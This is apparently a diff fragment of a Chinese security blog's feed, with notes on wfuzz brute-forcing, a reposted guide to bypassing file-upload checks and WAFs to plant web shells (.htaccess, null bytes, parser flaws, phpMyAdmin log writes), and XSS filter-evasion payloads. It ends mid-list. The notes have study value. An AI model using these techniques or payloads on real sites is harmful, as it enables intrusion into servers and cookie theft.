+<li><p>tldextract模块<br>获取域名和后缀</p>
+</li>
+</ul>
+<p>print(“xxx”,end=””)<br>使得字符串末尾不添加一个换行符,而是添加一个空字符串</p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爆破工具wfuzz的使用笔记</title>
+    <url>/2019/04/09/%E5%B7%A5%E5%85%B7wfuzz%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>推荐米斯特的wfuzz手册三部曲</p>
+<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><ul>
+<li><p>-c：用颜色输出</p>
+</li>
+<li><p>-v：详细的信息</p>
+<a id="more"></a></li>
+<li><p>-o 打印机：由stderr输出格式</p>
+</li>
+<li><p>-p addr：使用代理（ip：port或ip：port-ip：port-ip：port）</p>
+</li>
+<li><p>-x type：使用SOCK代理（SOCKS4，SOCKS5）</p>
+</li>
+<li><p>-t N：指定线程数（默认20个）</p>
+</li>
+<li><p>-s N：指定请求之间的时间延迟（默认为0）</p>
+</li>
+</ul>
+<ul>
+<li><p>-e <type>：可用编码/有效载荷/迭代器/打印机的列表</p>
+<ul>
+<li><p>-R depth：递归路径发现</p>
+</li>
+<li><p>-I：使用HTTP HEAD而不是GET方法（没有HTML主体响应）。</p>
+</li>
+</ul>
+</li>
+<li><p>–follow：遵循重定向</p>
+</li>
+</ul>
+<ul>
+<li><p>-m iterator：指定迭代器（默认产品）</p>
+</li>
+<li><p>-z payload ：指定有效载荷（类型，参数，编码）</p>
+</li>
+<li><p>-V alltype：所有参数bruteforcing（allvars和allpost）。不需要FUZZ关键字。</p>
+</li>
+</ul>
+<ul>
+<li><p>-X：HTTP方法中的有效载荷（例如：“FUZZ HTTP / 1.0”）。不需要FUZZ关键字。</p>
+</li>
+<li><p>-b cookie：为请求指定一个cookie</p>
+</li>
+<li><p>-d postdata：传输post数据（例如：“id = FUZZ＆catalog = 1”）</p>
+</li>
+<li><p>-H headers：使用头文件（例如：”Host:<a href="http://www.mysite.com,Cookie:id=1312321&amp;user=FUZZ&quot;）">www.mysite.com,Cookie:id=1312321&amp;user=FUZZ&quot;）</a></p>
+</li>
+<li><p>–basic/ntlm/digest auth：格式为“user：pass”或“FUZZ：FUZZ”或“domain \ FUZ2Z：FUZZ”</p>
+</li>
+</ul>
+<ul>
+<li><p>–hc/hl/hw/hh N[,N]+ ：隐藏指定的代码/行/字/字符的resposnes（使用BBB从基线获取值）</p>
+<ul>
+<li><p>–hs regex ：在响应中隐藏具有指定正则表达式的响应</p>
+</li>
+<li><p>–sl（show lines），–sw（show word），–sh （show chars）<br>显示响应结果的使用方法跟隐藏时的原理一样，只不过参数变为了：–sc（show code）</p>
+<h5 id="使用Baseline-基准线"><a href="#使用Baseline-基准线" class="headerlink" title="使用Baseline(基准线)"></a>使用Baseline(基准线)</h5><p>过滤器可以是某个HTTP响应的引用，这样的引用我们称为Baseline。<br>之前的使用–hh进行过滤的例子中，还可以使用下面的命令代替：</p>
+</li>
+</ul>
+</li>
+<li><p>wfuzz -w 字典–hh BBB <a href="https://www.baidu.com/FUZZ{404there}" target="_blank" rel="noopener">https://www.baidu.com/FUZZ{404there}</a></p>
+<blockquote>
+<p>解释下<a href="https://www.baidu.com/FUZZ{404there}的意思，这里代表wfuzz第一个请求是请求https://www.baidu.com/404there这个网址，在{" target="_blank" rel="noopener">https://www.baidu.com/FUZZ{404there}的意思，这里代表wfuzz第一个请求是请求https://www.baidu.com/404there这个网址，在{</a> }内的值用来指定wfuzz第一个请求中的FUZZ占位符，而这第一个请求被标记为BBB（BBB不能换成别的）基准线；其次这里使用的参数是–hh，也就是以BBB这条请求中的Chars为基准，其他请求的Chars值与BBB相同则隐藏。</p>
+</blockquote>
+</li>
+</ul>
+<p> 相关payloads</p>
+<blockquote>
+<p>wfuzz -e payloads</p>
+</blockquote>
+<p><img src="/images/pasted-37.png" alt="upload successful"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>基本使用</p>
+<ul>
+<li>wfuzz -w 字典  <a href="https://test.com/FUZZ" target="_blank" rel="noopener">https://test.com/FUZZ</a></li>
+</ul>
+<p>隐藏指定的代码</p>
+<ul>
+<li>wfuzz -w 字典 –hc 404,403 <a href="http://test.com/FUZZ" target="_blank" rel="noopener">http://test.com/FUZZ</a></li>
+</ul>
+<p>遍历</p>
+<ul>
+<li>wfuzz -z range,000-999  <a href="http://www.test.com/a.php?id=FUZZ" target="_blank" rel="noopener">http://www.test.com/a.php?id=FUZZ</a></li>
+</ul>
+<p>爆破登陆框</p>
+<ul>
+<li><p>wfuzz -z file,users.txt -z file,pass.txt –hc 404 <a href="http://www.test.com/login.asp?user=FUZZ&amp;pass=FUZ2Z" target="_blank" rel="noopener">http://www.test.com/login.asp?user=FUZZ&amp;pass=FUZ2Z</a>  或者</p>
+</li>
+<li><p>wfuzz -w 用户名字典 -w 密码字典 -d “username=FUZZ&amp;password=FUZ2Z”   <a href="http://www.test.com/login.asp" target="_blank" rel="noopener">http://www.test.com/login.asp</a></p>
+<p>想要同时爆破目录、文件名、后缀，可以：</p>
+</li>
+<li><p>wfuzz -w 目录字典路径 -w 文件名字典路径 -w 后缀名字典路径 URL/FUZZ/FUZ2Z.FUZ3Z</p>
+</li>
+</ul>
+<p>cookie测试</p>
+<ul>
+<li>wfuzz -z range,000-999 -b session=session -b cookie=cookie  <a href="http://www.test.com/login.asp?id=FUZZ" target="_blank" rel="noopener">http://www.test.com/login.asp?id=FUZZ</a></li>
+</ul>
+<p>http头测试</p>
+<ul>
+<li>wfuzz -w 字典 -H “X-Forwarded-For:FUZZ” <a href="http://www.test.com/login.asp?id=6666" target="_blank" rel="noopener">http://www.test.com/login.asp?id=6666</a><br>… …<br>未完待续</li>
+</ul>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>链接：<a href="https://www.fujieace.com/kali-linux/courses/wfuzz-2.html" target="_blank" rel="noopener">https://www.fujieace.com/kali-linux/courses/wfuzz-2.html</a><br>作者：付杰<br>链接：<a href="https://www.secpulse.com/archives/78638.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/78638.html</a><br>作者：key</p>
+<p>wfuzz手册三部曲</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web渗透笔记之文件上传漏洞</title>
+    <url>/2019/04/05/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><strong>转载</strong></p>
+<ol>
+<li><p>前端代码</p>
+</li>
+<li><p>逻辑绕过</p>
+<a id="more"></a></li>
+<li><p>文件内容检测</p>
+</li>
+<li><p>文件包含、文件备份</p>
+</li>
+<li><p>容器及语言特性</p>
+</li>
+<li><p>畸形报文</p>
+</li>
+<li><p>系统特性</p>
+</li>
+<li><p>SQLI方面</p>
+</li>
+</ol>
+<p><strong>上传文件时WAF检测点：</strong></p>
+<p>1）请求的url，url是否合法</p>
+<p>2）Boundary边界，通过Boundary边界确定内容来检测内容</p>
+<p>3）MIME类型，即content-type</p>
+<p>4）文件扩展名</p>
+<p>5）文件内容</p>
+<p><strong>文件上传后导致的常见安全问题一般有:</strong></p>
+<p>1）上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</p>
+<p>2）上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);</p>
+<p>3）上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p>
+<p>4）上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p>
+<p>本文重点是web层面的web shell</p>
+<p>需要注意的要点：</p>
+<p>1）上传后的路径在哪里</p>
+<p>2）上传后的文件名是否被修改了</p>
+<h2 id="前端代码绕过"><a href="#前端代码绕过" class="headerlink" title="前端代码绕过"></a>前端代码绕过</h2><p>主要是通过前端的JavaScript进行过滤，可以十分简单地绕过。如正常发包，之后抓包修改。</p>
+<h2 id="逻辑绕过"><a href="#逻辑绕过" class="headerlink" title="逻辑绕过"></a>逻辑绕过</h2><h4 id="2-1MIME检测"><a href="#2-1MIME检测" class="headerlink" title="2.1MIME检测"></a>2.1MIME检测</h4><ul>
+<li>后台代码通过检测客户端请求报文中的Content-Type字段来判断文件类型.，可以先上传正常文件再修改文件内容与文件名进行绕过。</li>
+<li>各类文件的mime类型，百度即可，此处不列举。</li>
+</ul>
+<h4 id="2-2文件后缀检测"><a href="#2-2文件后缀检测" class="headerlink" title="2.2文件后缀检测"></a>2.2文件后缀检测</h4><p>逻辑不严谨，过滤不严谨，导致被绕过</p>
+<ol>
+<li><p>采用黑名单，简单地过滤了“php”，但通过大小写的方式可以绕过WAF；或是替换了php等关键字符，通过双写 pphphp 即可绕过，这种简单的过滤方式可以通过上传之后查看文件名来判断。</p>
+</li>
+<li><p>没有过滤.htacess文件上传。这时可以借助.htaccess文件来上传恶意代码并解析。如：上传一个.htaccess文件，内容为AddTypeapplication/x-httpd-php .jpg，上传的jpg文件就可以当作php来解析  </p>
+<ul>
+<li>新建一个.htaccess 文件，里面的内容如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;pino&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+这个时候就上传一个文件名字是pino，这个时候我们上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接，可以成功！</li>
+</ul>
+</li>
+<li><p>没有过滤掉可以被解析的.asa、.cdx、.cer等，所以还应该使用白名单来防御。</p>
+</li>
+</ol>
+<h4 id="2-3-二次上传"><a href="#2-3-二次上传" class="headerlink" title="2.3 二次上传"></a>2.3 二次上传</h4><p>主要是代码的逻辑漏洞，用户上传一次文件后，网站系统就设置允许用户下一次的上传，不再对用户的上传文件进行检测，这个比较奇葩。</p>
+<h2 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h2><ol>
+<li><p>通过检测文件内容是否含有正常文件的一些关键字符</p>
+</li>
+<li><p>是否含有恶意代码</p>
+</li>
+<li><p>检测文件的大小，如果文件太小了或是太大了都可能上传失败。可以添加一些无用的字符来增加文件的大小。</p>
+</li>
+</ol>
+<p>针对（1），我们可以在文件之中添加一些相应文件的标识，如下表；<br>|类型| 标识 |<br>|–|–|<br>|JPEG  | 头标识 ff d8 ,结束标识 ff d9 |<br>|PNG | 头标识89 50 4E 47 0D 0A 1A 0A|<br>|GIF|头标识 (6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a|<br>|BMP|头标识 (2 bytes) 42 4D BM|</p>
+<p>或是使用windows下的copy命令来将.php文件内容附加到正常的.png文件，合成后的文件后缀名根据情况修改。</p>
+<ul>
+<li><p>假设选择我的图片是：1.jpg</p>
+</li>
+<li><p>一句话是：2.php</p>
+</li>
+<li><p>命令：<code>copy 1.jpg/b+2.php/a 1.jpg</code></p>
+<h2 id="文件包含、文件备份"><a href="#文件包含、文件备份" class="headerlink" title="文件包含、文件备份"></a>文件包含、文件备份</h2></li>
+<li><p>假如网站存在文件包含漏洞，可利用文件包含 来包含任意文件，如包含png文件解析一句话木马。</p>
+</li>
+<li><p>有的网站存在文件备份，数据库备份等一些可以利用的功能，如将.doc文件备份为.php文件，这些都是需要细心注意的。</p>
+<h2 id="容器及语言特性"><a href="#容器及语言特性" class="headerlink" title="容器及语言特性"></a>容器及语言特性</h2><pre><code>PHP   版本 &lt;5.3.4</code></pre></li>
+<li><p>据说是因为PHP沿用了C语言空字符截断的特性，官方认为这不是一个漏洞，但最后还是修改了。截断漏洞的发生是有条件的。</p>
+</li>
+<li><p>首先需要知道，在代码层面，假如“文件名不分离”，截断是无法作用的。比如，filename=hack.php%00.gif，PHP代码拿到的文件名是hack.php。但是，有的程序员可能会写下  $_FILES[ ‘uploaded’ ][‘name’ ].’png’之类的代码导，也不检查文件名，就导致漏洞的发生。</p>
+</li>
+<li><p>假如不是在代码层面上检测上传的文件名，这个检测者 WAF 拿到的文件名就是 hack.php%00.gif，它认为%00是正常字符串，然后漏洞就发生了。</p>
+</li>
+<li><p>最后一点，在使用截断%00时需要urlencode 一下。</p>
+</li>
+</ul>
+<h5 id="Apache解析漏洞（Apache1-x-2-x）"><a href="#Apache解析漏洞（Apache1-x-2-x）" class="headerlink" title="Apache解析漏洞（Apache1.x 2.x）"></a>Apache解析漏洞（Apache1.x 2.x）</h5><p>文件名解析漏洞，遇到不认识的后缀类型会忽略并继续向前寻找后缀来解析，比如a.php.gif或a.php.aaa</p>
+<h5 id="IIS-6-0-IIS-5-X"><a href="#IIS-6-0-IIS-5-X" class="headerlink" title="IIS 6.0/IIS 5.X"></a>IIS 6.0/IIS 5.X</h5><ol>
+<li>目录名，包含 .asp.asa .cer，则该目录下的文件都将被解析为 .asp文件</li>
+<li>文件名中，分号本身以及后面的都会被系统忽略 a.asp;.gif</li>
+<li>文件名，文件后缀名字中为.asp .asa .cer,cdx 之一，都会被解析为 .asp文件</li>
+</ol>
+<h5 id="Nginx-lt-8-03-空字节代码执行漏洞"><a href="#Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="Nginx &lt;8.03 空字节代码执行漏洞"></a>Nginx &lt;8.03 空字节代码执行漏洞</h5><ol>
+<li>版本 0.5.* |0.6.* | 0.7 - 0.7.65 |  0.8 - 0.8.37<br>利用0截断，如shell.jpg%00.php<br>访问以下网址，服务器将把xx.jpg文件当做php解析并执行。<br><a href="http://www.xxx.com/xx.jpg%00.php" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg%00.php</a></li>
+<li>版本0.8.41-1.5.6<br>利用0截断，如shell.png%20%00.php</li>
+</ol>
+<h5 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞</h5><p>PHP CGI解析漏洞<br>在默认Fast-CGI开启状况下，访问以下网址，服务器将把xx.jpg文件当做php解析并执行。</p>
+<p><a href="http://www.xxx.com/xx.jpg/.php" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg/.php</a></p>
+<h5 id="CVE-2013-4547-Nginx解析漏洞"><a href="#CVE-2013-4547-Nginx解析漏洞" class="headerlink" title="CVE-2013-4547 Nginx解析漏洞"></a>CVE-2013-4547 Nginx解析漏洞</h5><p><a href="http://www.xxx.com/a.jpg%00\0.php" target="_blank" rel="noopener">http://www.xxx.com/a.jpg%00\0.php</a></p>
+<h2 id="畸形报文"><a href="#畸形报文" class="headerlink" title="畸形报文"></a>畸形报文</h2><p>WAF对报文格式过于信任，没有处理这类问题，可能导致被绕过。</p>
+<h5 id="Multi-Content-Disposition："><a href="#Multi-Content-Disposition：" class="headerlink" title="Multi Content-Disposition："></a>Multi Content-Disposition：</h5><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个<br>Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过。</p>
+<p><img src="/images/pasted-20.png" alt="upload successful"></p>
+<h5 id="请求正文格式问题"><a href="#请求正文格式问题" class="headerlink" title="请求正文格式问题"></a>请求正文格式问题</h5><ol>
+<li>顺序</li>
+</ol>
+<blockquote>
+<p>Content-Disposition: form-data; name=”file1”;filename=”shell.asp”<br>Content-Type: application/octet-stream</p>
+</blockquote>
+<p>正常的upload请求都是以上这样，然而这个格式也并非强制性的，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
+<p><img src="/images/pasted-21.png" alt="upload successful"><br>2. 插入特殊字符<br> 一个空格导致安全狗被绕过：<br>Win + IIS6.0 + ASP</p>
+<p><img src="/images/pasted-22.png" alt="upload successful"><br>边界多了两横杠导致，边界匹配不成功<br>Win2k3 + IIS6.0 + ASP</p>
+<p><img src="/images/pasted-23.png" alt="upload successful"><br>3. 长度</p>
+<p>数据过长导致的绕过：<br>waf如果对Content-Disposition长度处理的不够好的话可能会导致绕过，例如：</p>
+<p><img src="/images/pasted-24.png" alt="upload successful"><br>基于构造长文件名，需要文件被重命名。</p>
+<p><img src="/images/pasted-25.png" alt="upload successful"></p>
+<p><img src="/images/pasted-26.png" alt="upload successful"><br>特殊的长文件名，文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p>
+<p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
+<h5 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a>文件覆盖</h5><p>php环境下， 开发者没有意识到一个请求包可能包含“两个文件”，开发者虽然对前面一个进行了十分严格的检测，但是最后一个文件可以覆盖掉前面的文件。如前面文件为 image/gif . xx.gjf，但后面跟了一个  image/gif  xx.php，最终保存的只是后面一个。<br>下面是一个请求包的示例。</p>
+<p><img src="/images/pasted-27.png" alt="upload successful"><br>在畸形报文方面，大家应该天马行空地想象，大胆尝试。</p>
+<h2 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h2><p> Windows特殊字符：</p>
+<p><img src="/images/pasted-44.png" alt="upload successful"></p>
+<p>Win+ IIS7.0 + PHP</p>
+<p><img src="/images/pasted-28.png" alt="upload successful"><br><strong>NTFS ADS特性：</strong></p>
+<p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
+<p><img src="/images/pasted-29.png" alt="upload successful"><br>Windows在创建文件时，在文件名末尾不管加多少点都会自动去除，那么上传时filename可以这么写shell.php……也可以这么写shell.php::$DATA…….。</p>
+<p>Win+ IIS7.0 + PHP</p>
+<p><img src="/images/pasted-30.png" alt="upload successful"></p>
+<h2 id="SQLI方面"><a href="#SQLI方面" class="headerlink" title="SQLI方面"></a>SQLI方面</h2><p>   SQLI漏洞利用</p>
+<p>用SQLI漏洞直接写入文件，需要满足四个条件，要求高</p>
+<ol>
+<li><p>写的权限，通常为 dba权限方可</p>
+</li>
+<li><p>单引号或双引号没有被过滤，因为文件名必须要用它们括起来</p>
+</li>
+<li><p>知道网站在服务器中的绝对路径</p>
+</li>
+<li><p>文件名不能重复，不算条件的条件</p>
+</li>
+</ol>
+<p>例如：select0xaaaa into outfile “/var/www/html/shell.php”</p>
+<p>遇到一些网站虽然有写的权限，但是由于写入的文件名必须要带单引号或是双引号（无法用十六进制的方式），导致无法写入，这也是蛋疼的地方。本人暂时不知道有没有什么办法绕过。</p>
+<h5 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h5><p>假如发现并进入phpmyadmin后台，也可以尝试拿shell，不过还是要知道网站的据对路径信息。</p>
+<p>1）利用SQL执行来写入一句话到网站后台中。</p>
+<p><img src="/images/pasted-31.png" alt="upload successful"></p>
+<p>如果网站的my.ini文件中没有包含“<code>secure_file_priv=</code>”这句话，就会提示如下错误信息。</p>
+<p><img src="/images/pasted-32.png" alt="upload successful"></p>
+<p>如果提示写入失败可以尝试其他目录，多试试，名字为uploads等的目录能够被写的可能性更高。</p>
+<p><img src="/images/pasted-33.png" alt="upload successful"></p>
+<p>2）通过日志来GetShell</p>
+<p>选择变量功能</p>
+<p><img src="/images/pasted-34.png" alt="upload successful"><br>搜索关键字 log 找到，下面两个东西，将”generallog”编辑为“ON”，且修改 “general log file”位置为网站的绝对路径</p>
+<p><img src="/images/pasted-35.png" alt="upload successful"></p>
+<p>之后在“SQL”执行功能中输入一句话并执行就OK了，log将记录这一句话。</p>
+<p><img src="/images/pasted-36.png" alt="upload successful"></p>
+<h2 id="竞争条件上传"><a href="#竞争条件上传" class="headerlink" title="竞争条件上传"></a>竞争条件上传</h2><p>有时木马上传会被waf查杀，但waf查杀木马需要时间。所以如果上传的文件命令是生成一个新的木马时，则可能绕过<br>具体做法是：</p>
+<blockquote>
+<p>文件上传后马上访问此文件，使得在未被查杀前生成一个新的木马，新的木马不在检测范围之内，于是成功绕过</p>
+</blockquote>
+<h1 id="开源编辑器上传漏洞"><a href="#开源编辑器上传漏洞" class="headerlink" title="开源编辑器上传漏洞"></a>开源编辑器上传漏洞</h1><h4 id="fckeditor"><a href="#fckeditor" class="headerlink" title="fckeditor"></a>fckeditor</h4><p>博客内容转自：<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247483678&amp;idx=1&amp;sn=3be9bad41fd1b0f405f8323073ce415b&amp;chksm=fbf79b6ecc801278abcfb113a2bbf02d97f8a04645cffa7ab3a98e05de38101132a14dfce38e&amp;mpshare=1&amp;scene=23&amp;srcid=0403E5T7waRwwBC04A9sExdv#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247483678&amp;idx=1&amp;sn=3be9bad41fd1b0f405f8323073ce415b&amp;chksm=fbf79b6ecc801278abcfb113a2bbf02d97f8a04645cffa7ab3a98e05de38101132a14dfce38e&amp;mpshare=1&amp;scene=23&amp;srcid=0403E5T7waRwwBC04A9sExdv#rd</a></p>
+<h1 id="文件上传漏洞修复"><a href="#文件上传漏洞修复" class="headerlink" title="文件上传漏洞修复"></a>文件上传漏洞修复</h1><ol>
+<li><p>服务器配置不当<br>重新配置好服务器。<br>服务器PUT方法配置不当可参见HTTP请求方法（PUT）。</p>
+</li>
+<li><p>开源编辑器上传漏洞<br>若新版编辑器已修复漏洞，请更新编辑器版本。</p>
+</li>
+<li><p>本地文件上传限制被绕过<br>在服务器后端对上传的文件进行过滤。</p>
+</li>
+<li><p>过滤不严或被绕过<br>建议使用白名单的方法对文件进行过滤。</p>
+</li>
+<li><p>文件解析漏洞导致文件执行<br>升级web服务器版本或安装相应的官方补丁。</p>
+</li>
+<li><p>文件路径截断<br>使用随机数改写文件名和文件路径,不要使用用户定义的文件名和文件路径。</p>
+</li>
+</ol>
+<p>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</p>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web渗透笔记之xss漏洞</title>
+    <url>/2019/04/03/eb%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bxss%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x01-xss漏洞简述"><a href="#0x01-xss漏洞简述" class="headerlink" title="0x01 xss漏洞简述"></a>0x01 xss漏洞简述</h2><h4 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类:"></a>xss分类:</h4><p><strong>反射型XSS</strong>：需要欺骗用户自己去点击攻击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+<a id="more"></a>
+<p><strong>存储型XSS（危害大）</strong>：一般在个人资料或留言，<strong>图片上传文件名</strong>等地方存在此漏洞，这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookies<br><strong>DOM型XSS</strong>：基于文档对象模型Document Objeet Model，DOM的一种漏洞.DOM是一个与平台，编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容，结构和样式，处理后的结果能够成为显示页面的一部分.DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。（dom型xss算是特殊的反射型xss，例如搜索框搜索后，网页标题出现搜索的内容。于是可在<titele>标签内闭合，然后插入xss恶意代码）</p>
+<ul>
+<li><a href="https://xsspt.com/index.php" target="_blank" rel="noopener">xss平台</a>：有许多模块，当用户收到xss恶意代码时，可从xss平台获得管理员cookie（前提是目标站没有httponly防护）<h2 id="0×02-常用编码"><a href="#0×02-常用编码" class="headerlink" title="0×02 常用编码"></a>0×02 常用编码</h2></li>
+</ul>
+<p><strong>URL编码：</strong><br>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)，&amp;字符被过滤时可尝试url编码</p>
+<p><strong>HTML实体编码：</strong><br>命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&lt;”</p>
+<p><strong>字符编码：</strong><br>十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&#060;”和“&#x3c;”</p>
+<p><strong>JS编码</strong>：js提供了四种字符编码的策略，</p>
+<blockquote>
+<p>1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”<br>2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”<br>3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”<br>4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</p>
+</blockquote>
+<hr>
+<p>例：<br>xss转16进制</p>
+<blockquote>
+<p>\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E</p>
+</blockquote>
+<p>xss转8进制</p>
+<blockquote>
+<p>\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\160\157\162\165\151\156\47\51\74\57\163\143\162\151\160\164\76</p>
+</blockquote>
+<p><strong>CSS编码</strong>：用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”<br><strong>复合编码</strong>：<br>所谓复合编码，也就是说输出的内容输出在多个环境中，例如</p>
+<pre><code>&lt;td onclick=”openUrl(add.do?userName=’&lt;%=value%&gt;’);”&gt;11&lt;/td&gt;</code></pre><p>value的内容首先出现在一个URL中，这个URL在一段javascript总，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。</p>
+<h2 id="0x03-绕过姿势"><a href="#0x03-绕过姿势" class="headerlink" title="0x03 绕过姿势"></a>0x03 绕过姿势</h2><h4 id="UBB标签"><a href="#UBB标签" class="headerlink" title="UBB标签"></a>UBB标签</h4><p>UBB标签是目前广泛运用到论坛，留言簿，以及其他网站系统的一种编码标签，类似[img]url[/img]这样的，用户在中间输入地址后即可，在发表的时候系统会自动改成 <code>&lt;img src=”url”&gt;&lt;/img&gt;</code>这个URL就是用户输入的图片地址，XSS攻击中，可以利用这个特点来达到无需用户输入&lt;&gt;就能执行由用户所输入的代码，我们只要在输入网址的地方输入：</p>
+<pre><code>x&quot;/**/onerror=&quot;alert(&apos;poruin&apos;)</code></pre><p>那么经过转换后就变成了</p>
+<pre><code>&lt;img src=&quot;x&quot;/**/onerror=&quot;alert(&apos;poruin&apos;)&quot;&gt;&lt;/img&gt;</code></pre><p>在JS中空格可以用/**/转换，如图：</p>
+<p><img src="/images/pasted-19.png" alt="upload successful"></p>
+<h4 id="JS还原函数"><a href="#JS还原函数" class="headerlink" title="JS还原函数"></a>JS还原函数</h4><ul>
+<li>JS中的编码还原函数最常用的就是String.fromCharCode了，这个函数用于ascii码的还原，一般来说，这个函数都要配合EVAL来使用才有效果。</li>
+<li>在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字alert被过滤掉，那就可以这么利用：</li>
+</ul>
+<pre><code>&gt;&lt;img src=&quot;x&quot;/**/onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,112,111,114,117,105,110,39,41))&quot;&gt;&lt;/img&gt;</code></pre><h4 id="大小写或编码绕过"><a href="#大小写或编码绕过" class="headerlink" title="大小写或编码绕过"></a>大小写或编码绕过</h4><p>大小写</p>
+<pre><code>&lt;sCRipt&gt;aleRt(1)&lt;/sCRipt&gt;</code></pre><p>编码按照0x01所说<br>特别是浏览器解码顺序为</p>
+<blockquote>
+<ul>
+<li>html解码–&gt;js解码，则可将javascript:alert(/xss/)进行html编码</li>
+<li>浏览器解码顺序为js解码–&gt;html解码，可进行js编码，绕过htmlspecialchars限制</li>
+</ul>
+</blockquote>
+<h4 id="双重标签绕过"><a href="#双重标签绕过" class="headerlink" title="双重标签绕过"></a>双重标签绕过</h4><p>遇到script过滤时，用&lt;scrip<script>t>alert(/xss/)</script>绕过</p>
+<h4 id="非-lt-script-gt-标签绕过"><a href="#非-lt-script-gt-标签绕过" class="headerlink" title="非&lt;script&gt;标签绕过"></a>非<code>&lt;script&gt;</code>标签绕过</h4><ul>
+<li><code>&lt;img src=1 onerror=alert(2)&gt;</code></li>
+</ul>
+<pre><code>&lt;img type=image src=https://xsspt.com/qlk7io onerror
+=prompt(1)&gt;</code></pre><p>onerror后要换行</p>
+<p>和sql一样用闭合</p>
+<ul>
